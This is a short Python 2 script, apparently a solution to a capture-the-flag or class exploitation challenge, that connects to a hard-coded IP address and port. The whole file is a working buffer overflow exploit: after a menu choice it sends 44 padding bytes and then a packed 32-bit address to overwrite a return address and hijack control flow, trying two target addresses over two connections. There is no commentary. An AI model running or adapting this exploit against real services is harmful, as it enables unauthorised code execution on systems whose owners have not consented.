import socket 
import sys
import time
x=0
while x<2:
	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	except socket.error,msg:
		print 'Failed to create socket. Error code:' + str(msg[0])+',Error message : '+msg[1]
		sys.exit();

	print 'Socket Created'

	host = '140.113.194.85'
	port = 49169

#x = 0 
#while x<2:
	#time.sleep(10)
	s.connect((host,port))
	data = s.recv(1024)
	print data
	s.send('1\r\n')
	try:
		while 1:
			data = s.recv(1024)
			print data
			i = 0 
			while i < 44:
				s.send('a')
				i+=1
			if x==1:
				s.send('\xcd\x88\x04\x08')
			else:
				s.send('\xed\x88\x04\x08')
				#s.send('\x2c\xb0\x04\x08')
				test = s.recv(1024)
				print test
			s.send('\r\n')
	except:
		s.close()
	x+=1
	#print 's.close'
